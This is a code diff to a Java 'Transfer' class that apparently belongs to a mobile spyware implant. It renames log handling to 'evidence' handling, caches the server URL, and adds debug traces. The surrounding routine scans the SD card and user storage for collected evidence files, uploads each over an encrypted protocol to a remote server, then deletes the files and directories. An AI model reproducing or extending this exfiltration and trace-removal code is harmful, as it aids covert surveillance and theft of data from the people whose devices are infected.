@@ -64,7 +64,7 @@ public class Transfer {
         return instance;
     }
 
-    private final EvidenceCollector logCollector;
+    private final EvidenceCollector evidenceCollector;
 
     private final Encryption crypto;
     private String host = "";
@@ -84,6 +84,7 @@ public class Transfer {
     public boolean reload = false;
 
     private Connection connection = null;
+    private String url;
 
     /** The challenge. */
     byte[] challenge = new byte[16];
@@ -95,7 +96,7 @@ public class Transfer {
      * Instantiates a new transfer.
      */
     protected Transfer() {
-        logCollector = EvidenceCollector.getInstance();
+        evidenceCollector = EvidenceCollector.getInstance();
         keys = Keys.getInstance();
         crypto = new Encryption();
     }
@@ -237,7 +238,8 @@ public class Transfer {
 
         //#ifdef DEBUG
         debug.info("connected: " + connected);
-
+        url = connection.url;
+        
         //#endif
         return connected;
 
@@ -965,19 +967,26 @@ public class Transfer {
 
     }
 
-    private void sendLogs(final String basePath) throws ProtocolException {
+    private void sendEvidences(final String basePath) throws ProtocolException {
         //#ifdef DEBUG
-        debug.info("sending logs from: " + basePath);
+        debug.info("sendEvidences from: " + basePath);
         //#endif
 
-        final Vector dirs = logCollector.scanForDirLogs(basePath);
+        final Vector dirs = evidenceCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
+        //#ifdef DEBUG
+        debug.trace("sendEvidences #directories: " + dsize);
+        //#endif
+        
         for (int i = 0; i < dsize; ++i) {
             final String dir = (String) dirs.elementAt(i);
-            final Vector logs = logCollector.scanForEvidences(basePath, dir);
+            final Vector logs = evidenceCollector.scanForEvidences(basePath, dir);
             final int lsize = logs.size();
+            //#ifdef DEBUG
+            debug.trace("    dir: " + dir + " #evidences: " + lsize);
+            //#endif
             for (int j = 0; j < lsize; ++j) {
-                final String logName = (String) logs.elementAt(j);
+                final String logName = (String) logs.elementAt(j); 
                 final String fullLogName = basePath + dir + logName;
                 final AutoFlashFile file = new AutoFlashFile(fullLogName, false);
                 if (!file.exists()) {
@@ -1000,7 +1009,7 @@ public class Transfer {
                     debug.error("cannot send file: " + fullLogName);
                     //#endif
                 }
-                logCollector.remove(fullLogName);
+                evidenceCollector.remove(fullLogName);
             }
             if (!Path.removeDirectory(basePath + dir)) {
                 //#ifdef DEBUG
@@ -1069,7 +1078,6 @@ public class Transfer {
         }
 
         return waitForOKorNO();
-
     }
 
     /**
@@ -1194,8 +1202,8 @@ public class Transfer {
         debug.info("syncEvidences connected: " + connected);
         //#endif
 
-        sendLogs(Path.SD());
-        sendLogs(Path.USER());
+        sendEvidences(Path.SD());
+        sendEvidences(Path.USER());
 
         sendCommand(Proto.LOG_END);
         waitForOK();
@@ -1249,7 +1257,7 @@ public class Transfer {
 
     }
 
-    public String getUrl() {
-        return connection.url;
+    public String getUrl() {     
+        return url;     
     }
 }
